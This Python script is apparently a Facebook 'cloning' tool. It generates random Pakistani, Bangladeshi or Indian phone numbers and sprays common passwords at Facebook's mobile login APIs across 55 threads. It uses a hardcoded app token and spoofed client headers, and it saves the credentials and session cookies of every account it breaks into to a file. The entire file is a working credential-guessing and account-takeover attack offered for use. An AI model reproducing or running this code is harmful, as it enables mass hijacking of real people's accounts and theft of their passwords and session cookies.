import os
import sys
import time
import uuid
import json
import string
import random
import requests
from requests.exceptions import ConnectionError as net_error
from concurrent.futures import ThreadPoolExecutor as speed

e = "\033[0m"
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
p = "\033[1;35m"
c = "\033[1;36m"
w = "\033[1;37m"

loop = 0
digits = []
okacc = []
cpacc = []
ugen = ["Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]"]

def logo():
    os.system("clear")
    print(banner)

def linex():
    print(f"{w}==================================================")

def xxx(x):
    return f"{w}[{g}{x}{w}]"

def main():
    logo()
    print(f" {xxx('1')} Random Cloning ")
    print(f" {xxx('2')} Contact with Author ")
    print(f" {xxx('3')} Exit Tools ")
    linex()
    RASHID = input(f" {xxx('?')} Select : ")
    if "1" in RASHID:
        r_number()
    elif "2" in RASHID:
        os.system("xdg-open https://www.facebook.com/MR.K4ZIM.404")
        main()
    elif "3" in RASHID:
        linex()
        print(f" {xxx('!')} {g}Thanks For Using Tools ")
        linex()
        sys.exit()
    else:
        linex()
        print(f" {xxx('!')} {g}Select Valid Option ")
        linex()
        time.sleep(1)
        main()

def r_number():
    logo()
    print(f" {xxx('1')} Pak Cloning ")
    print(f" {xxx('2')} Bd Cloning ")
    print(f" {xxx('3')} India Cloning ")
    linex()
    c = input(f" {xxx('?')} Select : ")
    if "1" in c:
        pak()
    elif "2" in c:
        bd()
    elif "3" in c:
        india()
    else:
        linex()
        print(f" {xxx('!')} {g}Select Valid Option ")
        linex()
        time.sleep(1)
        main()

def pak():
    logo()
    print(f" {xxx('•')} Example : {g}0310, 0320, 0330, 0340 ")
    linex()
    code = input(f" {xxx('?')} Enter Code : ")
    logo()
    print(f" {xxx('•')} Exampel : {g}1000, 2000, 5000, 10000 ")
    linex()
    limit = int(input(f" {xxx('?')} Enter Limit : "))
    for _ in range(limit):
        digits.append("".join(random.choices(string.digits, k=7)))
    logo()
    print(f" {xxx('1')} Method (B-Api) ")
    print(f" {xxx('2')} Method (B-Graph) ")
    linex()
    m = input(f" {xxx('?')} Select : ")
    with speed(max_workers=55) as process:
        logo()
        total_idz = str(len(digits))
        print(f" {xxx('•')} Total Accounts  : {g}{total_idz} ")
        print(f" {xxx('•')} Code You Choose : {g}{code} ")
        print(f" {xxx('!')} {r}If No Result Turn On/Off Flight Mode ")
        linex()
        for love in digits:
            uid = code+love
            pword = [love,code+love,"pakistan","janjan","king123","kingkhan","malik123","baloch123"]
            if "1" in m:
                process.submit(m1, uid, pword, total_idz)
            elif "2" in m:
                process.submit(m2, uid, pword, total_idz)
            else:
                process.submit(m1, uid, pword, total_idz)
    linex()
    print(f" {xxx('!')} Process Completed ")
    print(f" {xxx('•')} Total Ok Accounts : {g}{str(len(okacc))} ")
    print(f" {xxx('•')} Total Cp Accounts : {r}{str(len(cpacc))} ")
    linex()
    input(f" {xxx('!')} Press Enter To Back ")
    sys.exit()

def bd():
    logo()
    print(f" {xxx('•')} Example : {g}016, 017, 018, 019 ")
    linex()
    code = input(f" {xxx('?')} Enter Code : ")
    logo()
    print(f" {xxx('•')} Exampel : {g}1000, 2000, 5000, 10000 ")
    linex()
    limit = int(input(f" {xxx('?')} Enter Limit : "))
    for _ in range(limit):
        digits.append("".join(random.choices(string.digits, k=7)))
    logo()
    print(f" {xxx('1')} Method (B-Api) ")
    print(f" {xxx('2')} Method (B-Graph) ")
    linex()
    m = input(f" {xxx('?')} Select : ")
    with speed(max_workers=55) as process:
        logo()
        total_idz = str(len(digits))
        print(f" {xxx('•')} Total Accounts  : {g}{total_idz} ")
        print(f" {xxx('•')} Code You Choose : {g}{code} ")
        print(f" {xxx('!')} {r}If No Result Turn On/Off Flight Mode ")
        linex()
        for love in digits:
            uid = code+love
            pword = [love[1:],love,code+love,"i love you","iloveyou","bangladesh","bangladesh123","708090","102030","777000","888000","999000","123456"]
            if "1" in m:
                process.submit(m1, uid, pword, total_idz)
            elif "2" in m:
                process.submit(m2, uid, pword, total_idz)
            else:
                process.submit(m1, uid, pword, total_idz)
    linex()
    print(f" {xxx('!')} Process Completed ")
    print(f" {xxx('•')} Total Ok Accounts : {g}{str(len(okacc))} ")
    print(f" {xxx('•')} Total Cp Accounts : {r}{str(len(cpacc))} ")
    linex()
    input(f" {xxx('!')} Press Enter To Back ")
    sys.exit()

def india():
    logo()
    print(f" {xxx('•')} Example : {g}091, 092, 093, 094 ")
    linex()
    code = input(f" {xxx('?')} Enter Code : ")
    logo()
    print(f" {xxx('•')} Exampel : {g}1000, 2000, 5000, 10000 ")
    linex()
    limit = int(input(f" {xxx('?')} Enter Limit : "))
    for _ in range(limit):
        digits.append("".join(random.choices(string.digits, k=7)))
    logo()
    print(f" {xxx('1')} Method (B-Api) ")
    print(f" {xxx('2')} Method (B-Graph) ")
    linex()
    m = input(f" {xxx('?')} Select : ")
    with speed(max_workers=55) as process:
        logo()
        total_idz = str(len(digits))
        print(f" {xxx('•')} Total Accounts  : {g}{total_idz} ")
        print(f" {xxx('•')} Code You Choose : {g}{code} ")
        print(f" {xxx('!')} {r}If No Result Turn On/Off Flight Mode ")
        linex()
        for love in digits:
            uid = code+love
            pword = [love,code+love,"57273200","59039200"]
            if "1" in m:
                process.submit(m1, uid, pword, total_idz)
            elif "2" in m:
                process.submit(m2, uid, pword, total_idz)
            else:
                process.submit(m1, uid, pword, total_idz)
    linex()
    print(f" {xxx('!')} Process Completed ")
    print(f" {xxx('•')} Total Ok Accounts : {g}{str(len(okacc))} ")
    print(f" {xxx('•')} Total Cp Accounts : {r}{str(len(cpacc))} ")
    linex()
    input(f" {xxx('!')} Press Enter To Back ")
    sys.exit()

def m1(uid, pword, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[RASHID-M1] [{loop}/{total_idz}] [OK/CP] [{len(okacc)}/{len(cpacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pword:
            ua_string = "Dalvik/2.1.0 (Linux; U; Android 8.1.0; G706 Build/O11019)[FBAN/FB4A;FBAV/696.0.0.49.324;FBPN/com.facebook.katana;FBLC/hi_IN;FBBV/340083195;FBCR/MTNL;FBMF/samsung;FBBD/samsung;FBDV/SM-N731T;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.3,width=720,height=1600};"
            data = {
                "email": uid,
                "password": pw,
                "cpl": "true",
                "credentials_type": "password",
                "error_detail_type": "button_with_disabled",
                "source": "login",
                "format": "json",
                "generate_session_cookies": "1",
                "generate_analytics_claim": "1",
                "generate_machine_id": "1",
            }
            headers = {
                "accept-encoding": "gzip, deflate", 
                "Accept": "*/*", 
                "Connection": "keep-alive", 
                "content-type": "application/x-www-form-urlencoded", 
                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", 
                "x-fb-friendly-name": "authenticate", 
                "x-fb-http-engine": "Liger",
                "user-agent": ua_string,
            }
            url = "https://b-api.facebook.com/method/auth.login"
            result = requests.post(url, data=data, headers=headers).json()
            if "session_key" in result:
                coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                print(f" {g}[RASHID-OK] {uid} | {pw}")
                print(f" {w}Cookies : {g}{coki}")
                open("/sdcard/RASHID-Ok.txt", "a").write(f"{uid}|{pw}\n")
                okacc.append(uid)
                break
            elif result["error_code"] == 405:
                print(f" {r}[RASHID-CP] {uid} | {pw}")
                open("/sdcard/RASHID-Cp.txt", "a").write(f"{uid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except:
        pass

def m2(uid, pword, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[RASHID-M2] [{loop}/{total_idz}] [OK/CP] [{len(okacc)}/{len(cpacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pword:
            ua_string = "Dalvik/2.1.0 (Linux; U; Android 10; Samsung Pixel 4 MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/253310653;FBCR/Verizon;FBMF/Samsung;FBBD/Samsung;FBDV/Pixel 4;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1"
            data = {'adid': str(uuid.uuid4()),
'format': 'json', 
'device_id': str(uuid.uuid4()),
'email': uid, 
'password': pw, 
'generate_analytics_claims': '1', 
'community_id': '', 
'cpl': 'true', 
'try_num': '1', 
'family_device_id': str(uuid.uuid4()),
'credentials_type': 'password', 
'source': 'login', 
'error_detail_type': 'button_with_disabled', 
'enroll_misauth': 'false', 
'generate_session_cookies': '1', 
'generate_machine_id': '1', 
'currently_logged_in_userid': '0', 
'locale': 'en_US', 
'client_country_code': 'US', 
'fb_api_req_friendly_name': 'authenticate', 
'api_key': '62f8ce9f74b12f84c123cc23437a4a32', 
'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}

            headers = {'User-Agent': ua_string, 
'Accept-Encoding': 'gzip, deflate', 
'Accept': '*/*', 
'Connection': 'close', 
'Content-Type': 'application/x-www-form-urlencoded', 
'Host': 'graph.facebook.com', 
'X-FB-Net-HNI': '37431', 
'X-FB-SIM-HNI': '32239', 
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
'X-FB-Connection-Type': 'WIFI', 
'X-Tigon-Is-Retry': 'False', 
'x-fb-session-id': str(uuid.uuid4()),
'x-fb-device-group': str(uuid.uuid4()),
'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
'X-FB-Request-Analytics-Tags': 'graphservice', 
'X-FB-HTTP-Engine': 'Liger', 
'X-FB-Client-IP': 'True', 
'X-FB-Server-Cluster': 'True', 
'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
            url = "https://b-graph.facebook.com/auth/login"
            result = requests.post(url, data=data, headers=headers).json()
            if "session_key" in result:
                coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                print(f" {g}[RASHID-OK] {uid} | {pw}")
                print(f" {w}Cookies : {g}{coki}")
                open("/sdcard/RASHID-Ok.txt", "a").write(f"{uid}|{pw}\n")
                okacc.append(uid)
                break
            elif "www.facebook.com" in result["error"]["message"]:
                print(f" {r}[RASHID-CP] {uid} | {pw}")
                open("/sdcard/RASHID-Cp.txt", "a").write(f"{uid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except:
        pass

banner = f"""{w}\
{g}88""Yb    db    .dP"Y8 88  88 88  8888b.  
888o  88 d8' `8b   `88'   88  `8D 
{r}88""Yb    db    .dP"Y8 88  88 88  8888b.  
{r}88"Yb   dP~~Yb   0`Y8b 888888 88  8I  dY 
88  V888 88   88   .88.   88   8D 
{g}88  Yb dP0  8bo' 8888  88  88 88. 88Y__                                                               
{w}==================================================
{w} >> Author  :  RASHID SINDHI
{w} >> Github  :  Rashid78
{w} >> Verison :  0.0
{w}==================================================\
"""

if __name__ == "__main__":
    main()
